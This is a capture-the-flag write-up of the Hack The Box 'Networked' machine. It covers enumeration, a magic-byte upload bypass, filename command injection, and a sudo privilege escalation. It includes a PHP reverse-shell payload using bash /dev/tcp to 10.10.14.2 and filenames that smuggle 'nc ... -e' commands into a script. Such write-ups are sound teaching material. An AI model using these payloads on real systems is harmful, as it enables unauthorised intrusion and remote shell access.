---
layout: default
title: "Hack The Box - Networked"
date: 2019-11-16
tags: magic-bytes network-scripts "sudo -l"
---

# **Networked - 10.10.10.146**

####  `Networked` is a simple, straight-forward machine with no rabbit holes, which is why it is a great machine. The IP of the machine is **10.10.10.146**. This machine like most machines in **HTB** comes with lot of new things to learn.


## **1.Enumeration**
  As always, let us begin the enumeration using `nmap`
  
### 1.1 nmap
  This is the result of running `nmap -sC -sV -p- 10.10.10.146`

  ``` bash
Nmap scan report for 10.10.10.146 (10.10.10.146)
Host is up (0.30s latency).
Not shown: 997 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.29 seconds

  ```

We see that two ports 22 and 80 are open in this machine. Considering higher probability of finding vulnerability in port 80, let us enumerate port 80.

### Port 80

![networked_webpage](/images/htb/Networked/networked_webpage.png)

Since we could not find much information in the webpage, let us dig in deeper and check if we can find more directories or web pages. For this, let us use `GoBuster`.

``` bash
gobuster dir --url=http://10.10.10.146 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.146
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/11/16 10:23:32 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)

```
Now, that looks promising. Let us go check out **/backup** first.

![networked_webpage_backup](/images/htb/Networked/networked_webpage_backup.png)

We see a `backup.tar` file that we can now download and analyze.

We have downloaded it, extracted contents of the compressed tar file and we see it has the following contents.

``` bash
root@b1nbash:~/Documents/HTB/Networked/backup# ls -al
total 24
drwxr-xr-x 2 root root 4096 Nov  4 20:47 .
drwxr-xr-x 3 root root 4096 Nov  5 03:26 ..
-rw-r--r-- 1 root root  229 Jul  9 17:03 index.php
-rw-r--r-- 1 root root 2001 Jul  2 17:08 lib.php
-rw-r--r-- 1 root root 1871 Jul  2 18:23 photos.php
-rw-r--r-- 1 root root 1331 Jul  2 18:15 upload.php
root@b1nbash:~/Documents/HTB/Networked/backup#
```

Examining the contents of `upload.php` we see that only image files are allowed. If we are able to bypass this check/filtering then we may achieve LFI (Local File Inclusion) and hence, RCE (Remote Code Execution). In `upload.php` we see that the extention of uploaded file is checked and also function `check_file_type()` from `lib.php` is being called to check the file signature to confirm the file type as image. These signatures are sometimes refered to as `the magic bytes`. Researching more on evading the magic byte check while uploading a shell script, we learn that a file starting with magic bytes `GIF89a` will be considered as a GIF image file. Now let us create a file **reverse.php.gif** with following contents.

```
GIF89a;
<h1>Reverse</h1><pre>
<?php shell_exec("bash -i >& /dev/tcp/10.10.14.2/1234 0>&1");
?>
```

## **2.Exploitation**

Now that we are ready with our exploit, let us upload the exploit php script and try to get a reverse shell in netcat, now listening on port 1234.
We go to page `/upload.php` as shown below.

![network_upload_1](/images/htb/Networked/network_upload_1.png)

Now we can browse and upload the `reverse.php.gif` file and we get the following result.

![netwrk_upload_2](/images/htb/Networked/network_upload_2.png)

To execute the php script we access `/photos.php`

![photos.php](/images/htb/Networked/network_photos.png)

We now get a reverse shell like below

![reverse-apache](/images/htb/Networked/networked_rev_shell.png)

But as we see below we are not able to access the user.txt file. To access it we have to become `guly`.


![permission-denied](/images/htb/Networked/networked_exploit_1.png)


## **3.Privilege Escalation**

### **Privilege Escalation- guly**
In the `/home/guly` directory we find a file named `check_attack.php`. Let us try to understand what the file does.

From the program we observe that `$path$value` is called to be deleted when attack observed. This is nothing but name of filenames in folder `/var/www/uploads/` with the full path. If we can give a command as input to the exec() we can get to execute that command. This requires manupilation of file name to contain the code we need to execute.
After trying names like `10_10_14_2;nc 10.10.14.2 9000 -e sh.png`, `10_10_14_2;nc 10.10.14.2 9000 -e bash &.png`, I realised that the reverse shell closes immediately. I tried doing `nc 10.10.14.2 9000 -e bash`and the same happened. Then I tried `nc 10.10.14.2 9000 -e /bin/bash`. This time, I got a stable shell !!!
Oops, how do we give that as file name ???
I decided to take help of environment variables, checked value of `$SHELL` and found it to be `/sbin/nologin`.
I changed the value of SHELL and made changes to file name as below

``` bash
bash-4.2$ export SHELL=/bin/bash
bash-4.2$ mv '10_10_14_2;nc 10.10.14.2 9000 -e bash &.png' '10_10_14_2;nc 10.10.14.2 9000 -e $SHELL &.png'
bash-4.2$
```
And I get reverse shell as gully :D

![reverse-shell-gully](/images/htb/Networked/networked_rev_guly.png)

## **Privilege Escalation - root**

To become root, we look at the available privileges we have using `sudo -l`.
``` bash
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$
```
So user `guly` has sudo privileges on `/usr/local/sbin/changename.sh`. Let us try running it with some random input.

![random_fuzz](/images/htb/Networked/networked_fuzz1.png)

So we observe that the input can be used to run arbitrary commands as root :)

![priv-escalate-root](/images/htb/Networked/networked_root.txt.png)

The second command given as value to PROXY_METHOD, gives us shell as root.

### > Note : Any suggestion or feedback is accepted :D [Twitter-link](https://twitter.com/7axmi)
